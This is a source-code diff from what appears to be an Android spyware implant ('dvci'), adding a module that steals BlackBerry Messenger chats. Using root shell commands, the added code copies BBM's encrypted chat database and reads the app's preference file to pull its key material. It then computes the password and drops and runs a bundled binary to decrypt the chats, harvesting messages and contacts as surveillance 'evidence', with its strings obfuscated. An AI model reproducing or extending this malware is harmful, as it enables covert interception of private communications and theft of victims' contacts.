@@ -1,22 +1,41 @@
 package com.android.dvci.module.chat;
 
 import android.database.Cursor;
+import android.util.Base64;
+import android.util.Log;
 
+import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
+import com.android.dvci.capabilities.XmlParser;
 import com.android.dvci.db.GenericSqliteHelper;
 import com.android.dvci.db.RecordGroupsVisitor;
 import com.android.dvci.db.RecordVisitor;
+import com.android.dvci.file.AutoFile;
 import com.android.dvci.module.ModuleAddressBook;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.Execute;
+import com.android.dvci.util.ExecuteResult;
+import com.android.dvci.util.StringUtils;
+import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
+import org.w3c.dom.Document;
+import org.w3c.dom.Element;
+import org.w3c.dom.NamedNodeMap;
+import org.w3c.dom.Node;
+import org.w3c.dom.NodeList;
 import org.xml.sax.SAXException;
 
 import java.io.IOException;
+import java.io.UnsupportedEncodingException;
+import java.text.Format;
 import java.util.ArrayList;
 import java.util.Date;
+import java.util.Formatter;
 import java.util.concurrent.Semaphore;
+import java.util.jar.Attributes;
 
+import javax.xml.parsers.DocumentBuilderFactory;
 import javax.xml.parsers.ParserConfigurationException;
 
 /**
@@ -45,7 +64,8 @@ public class ChatBBM extends SubModuleChat {
 
 	String pObserving = M.e("com.bbm");
 	String dbFileMaster = M.e("/data/data/com.bbm/files/bbmcore/master.db");
-	String dbFileGroup = M.e("/data/data/com.bbm/files/bbgroups/bbgroups.db");
+	String dbFileMasterEnc = M.e("/data/data/com.bbm/files/bbmcore/master.enc");
+	String bbmPref = M.e("/data/data/com.bbm/shared_prefs/com.blackberry.bbm.PREFERENCES.xml");
 
 	private long lastBBM;
 	Semaphore readChatSemaphore = new Semaphore(1, true);
@@ -94,8 +114,11 @@ public class ChatBBM extends SubModuleChat {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (updateHistory) cannot open db");
 				}
-				return;
 			}
+			if (helper == null) {
+				helper = openBBMChatEnc(dbFileMasterEnc);
+			}
+
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (start), read lastBBM: " + lastBBM);
@@ -118,6 +141,119 @@ public class ChatBBM extends SubModuleChat {
 			}
 			readChatSemaphore.release();
 		}
+	}
+
+	private GenericSqliteHelper openBBMChatEnc(String dbFileMasterEnc) {
+		String password = calculateBBMChatPassword();
+
+		String pack = Status.self().getAppContext().getPackageName();
+		final String installPath = String.format(M.e("/data/data/%s/files"), pack);
+
+		final AutoFile bbconvert = new AutoFile(installPath, M.e("bb")); // selinux_suidext
+		final AutoFile dbplain = new AutoFile(installPath, M.e("p.db"));
+		final AutoFile dbenc = new AutoFile(installPath, M.e("e.db"));
+		dbplain.delete();
+		dbenc.delete();
+
+		if(! Utils.dumpAsset(M.e("bb.data"), bbconvert.getName())){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (openBBMChatEnc), Error, cannot find resource");
+			}
+			return null;
+		}
+
+		Execute.execute(M.e("/system/bin/chmod 755 ") + bbconvert.getFilename());
+
+		String command = String.format(M.e("cat %s > %s"), dbFileMasterEnc, dbenc);
+		ExecuteResult res = Execute.executeRoot(command);
+
+		Execute.executeRoot(M.e("/system/bin/chmod 777 ") + dbenc.getFilename());
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (openBBMChatEnc) execute: " + command + " ret: " + res.exitCode);
+		}
+
+		if(!dbenc.exists()){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (openBBMChatEnc), ERROR dbenc");
+			}
+			return null;
+		}
+
+		command = String.format("%s %s %s %s", bbconvert.getFilename(), dbenc, dbplain.getFilename(), password);
+		res = Execute.execute(command);
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (openBBMChatEnc) execute: " + bbconvert + " ret: " + res.exitCode);
+		}
+
+		bbconvert.delete();
+		dbenc.delete();
+
+		GenericSqliteHelper helper = null;
+		if(dbplain.exists()){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (openBBMChatEnc), dbplain size: " + dbplain.getSize());
+			}
+			helper = GenericSqliteHelper.openAsCopy(dbplain.getFilename());
+
+		}
+		return helper;
+	}
+
+	private String calculateBBMChatPassword() {
+		ChatBBM_Crypto crypto = new ChatBBM_Crypto();
+		String sql_key = null;
+		String app_guid = null;
+		ExecuteResult res = Execute.executeRoot("cat " + bbmPref);
+
+		String xml = res.getStdout();
+		try {
+			Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(StringUtils.stringToInputStream(xml));
+
+			NodeList nodes = doc.getElementsByTagName("string");
+			for (int i = 0; i < nodes.getLength(); i++) {
+				Element n = (Element) nodes.item(i);
+
+				if("sql_key".equals(n.getAttribute("name"))){
+					sql_key = n.getFirstChild().getNodeValue();
+				}
+
+				if("app_guid".equals(n.getAttribute("name"))){
+					app_guid = n.getFirstChild().getNodeValue();
+				}
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (openBBMChatEnc), sql_key: %s", sql_key);
+				Check.log(TAG + " (openBBMChatEnc), app_guid: %s", app_guid);
+			}
+
+		} catch (Exception e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (openBBMChatEnc), ERROR", e);
+			}
+		}
+
+		String ret = null;
+		try {
+			ret = crypto.decrypt(sql_key, app_guid);
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+		byte[] data = null;
+		try {
+			data = ret.getBytes("UTF-8");
+		} catch (UnsupportedEncodingException e1) {
+			e1.printStackTrace();
+		}
+
+		String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (openBBMChatEnc), db: %s", b64);
+		}
+
+		return b64;
 	}
 
 
@@ -143,9 +279,13 @@ public class ChatBBM extends SubModuleChat {
 
 			GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFileMaster);
 			if (helper == null) {
+				helper =  openBBMChatEnc(dbFileMasterEnc);
+			}
+			if (helper == null) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (start) cannot open db");
 				}
+
 				return;
 			}
 
@@ -158,6 +298,7 @@ public class ChatBBM extends SubModuleChat {
 
 			} finally {
 				helper.disposeDb();
+
 			}
 			started = true;
 
@@ -182,7 +323,7 @@ public class ChatBBM extends SubModuleChat {
 			}
 		};
 
-		helper.traverseRawQuery("SELECT count(name) FROM sqlite_master WHERE type='table' and name = 'UserPins'", null, visitor);
+		helper.traverseRawQuery(M.e("SELECT count(name) FROM sqlite_master WHERE type='table' and name = 'UserPins'"), null, visitor);
 		return type[0];
 	}
 
@@ -204,21 +345,7 @@ public class ChatBBM extends SubModuleChat {
 	}
 
 	private long readBBMGroupHistory() {
-		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFileGroup);
-		if (helper == null) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (start) cannot open db");
-			}
-			return 0;
-		}
-
-		try {
-			// TODO
-
-		} finally {
-			helper.disposeDb();
-		}
-
+		//
 		return 0;
 	}
 
@@ -227,16 +354,8 @@ public class ChatBBM extends SubModuleChat {
 		String timestamp = Long.toString(this.lastBBM / 1000);
 		final ChatGroups groups = new ChatGroups();
 		RecordGroupsVisitor visitorGrp = new RecordGroupsVisitor(groups,"T.TIMESTAMP", true);
-		String[] sql = new String[]{"SELECT C.CONVERSATIONID,P.USERID,U.DISPLAYNAME,U.PIN FROM PARTICIPANTS AS P " +
-				"JOIN CONVERSATIONS AS C ON C.CONVERSATIONID = P.CONVERSATIONID " +
-				"JOIN USERS AS U ON U.USERID = P.USERID " +
-				"WHERE C.MESSAGETIMESTAMP > ?",
-				"SELECT C.CONVERSATIONID,P.USERID,U.DISPLAYNAME,S.PIN FROM PARTICIPANTS AS P " +
-						"JOIN CONVERSATIONS AS C ON C.CONVERSATIONID = P.CONVERSATIONID " +
-						"JOIN USERS AS U ON U.USERID = P.USERID " +
-						"JOIN USERPINS AS S ON U.USERID = S.USERID " +
-						"WHERE C.MESSAGETIMESTAMP > ?"
-				};
+		String[] sql = new String[]{ M.e("SELECT C.CONVERSATIONID,P.USERID,U.DISPLAYNAME,U.PIN FROM PARTICIPANTS AS P JOIN CONVERSATIONS AS C ON C.CONVERSATIONID = P.CONVERSATIONID JOIN USERS AS U ON U.USERID = P.USERID WHERE C.MESSAGETIMESTAMP > ?"),
+				M.e("SELECT C.CONVERSATIONID,P.USERID,U.DISPLAYNAME,S.PIN FROM PARTICIPANTS AS P JOIN CONVERSATIONS AS C ON C.CONVERSATIONID = P.CONVERSATIONID JOIN USERS AS U ON U.USERID = P.USERID JOIN USERPINS AS S ON U.USERID = S.USERID WHERE C.MESSAGETIMESTAMP > ?")	};
 
 		helper.traverseRawQuery(sql[version], new String[]{timestamp}, visitorGrp);
 		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
@@ -259,7 +378,7 @@ public class ChatBBM extends SubModuleChat {
 		final String me_number =me.number;
 		final String me_name = me.name;
 
-		RecordVisitor visitorMsg = new RecordVisitor(null, null, "T.TIMESTAMP") {
+		RecordVisitor visitorMsg = new RecordVisitor(null, null, M.e("T.TIMESTAMP")) {
 			@Override
 			public long cursor(Cursor cursor) {
 				String groupid = cursor.getString(0);
@@ -293,13 +412,7 @@ public class ChatBBM extends SubModuleChat {
 			}
 		};
 
-		String sqlmsg ="SELECT C.CONVERSATIONID,T.TIMESTAMP,T.CONTENT, U.USERID\n" +
-				"FROM TEXTMESSAGES AS T\n" +
-				"JOIN CONVERSATIONS AS C ON T.CONVERSATIONID = C.CONVERSATIONID\n" +
-				"JOIN PARTICIPANTS AS P ON P.PARTICIPANTID = T.PARTICIPANTID\n" +
-				"JOIN USERS AS U ON U.USERID = P.USERID\n" +
-				"WHERE T.TIMESTAMP>?\n" +
-				"AND C.CONVERSATIONID=?\n";
+		String sqlmsg = M.e("SELECT C.CONVERSATIONID,T.TIMESTAMP,T.CONTENT, U.USERID FROM TEXTMESSAGES AS T JOIN CONVERSATIONS AS C ON T.CONVERSATIONID = C.CONVERSATIONID JOIN PARTICIPANTS AS P ON P.PARTICIPANTID = T.PARTICIPANTID JOIN USERS AS U ON U.USERID = P.USERID WHERE T.TIMESTAMP>? AND C.CONVERSATIONID=?");
 
 		long maxid = 0;
 		for( String group: groups.getAllGroups() ){
@@ -339,7 +452,7 @@ public class ChatBBM extends SubModuleChat {
 
 	private void readAddressContactsUserPins(GenericSqliteHelper helper) throws SAXException, IOException, ParserConfigurationException {
 
-		String sql = "SELECT u.userid,pin,displayname FROM Users as u JOIN UserPins as p on u.UserId=p.UserId";
+		String sql = M.e("SELECT u.userid,pin,displayname FROM Users as u JOIN UserPins as p on u.UserId=p.UserId");
 		RecordVisitor visitor = new RecordVisitor() {
 			@Override
 			public long cursor(Cursor cursor) {
@@ -359,7 +472,7 @@ public class ChatBBM extends SubModuleChat {
 
 	private void readAddressContactsUsers(GenericSqliteHelper helper) throws SAXException, IOException, ParserConfigurationException {
 
-		RecordVisitor visitor = new RecordVisitor(new String[]{"userid", "pin", "displayname"}, null) {
+		RecordVisitor visitor = new RecordVisitor(StringUtils.split(M.e("userid,pin,displayname")), null) {
 			@Override
 			public long cursor(Cursor cursor) {
 				int userid = cursor.getInt(0);
@@ -367,6 +480,9 @@ public class ChatBBM extends SubModuleChat {
 				String name = cursor.getString(2).trim();
 
 				Contact contact = new Contact(Integer.toString(userid), name, name, pin);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (cursor), contact: " + contact);
+				}
 				ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.BBM, contact);
 
 				return userid;
@@ -378,7 +494,7 @@ public class ChatBBM extends SubModuleChat {
 
 	private void readLocalContact(GenericSqliteHelper helper) {
 
-		String sql = "SELECT  p.UserId, p.Pin,  u.DisplayName FROM Profile as p JOIN Users as u on p.UserId = u.UserId";
+		String sql = M.e("SELECT  p.UserId, p.Pin,  u.DisplayName FROM Profile as p JOIN Users as u on p.UserId = u.UserId");
 		account = new Account();
 
 		RecordVisitor visitor = new RecordVisitor(null, null) {
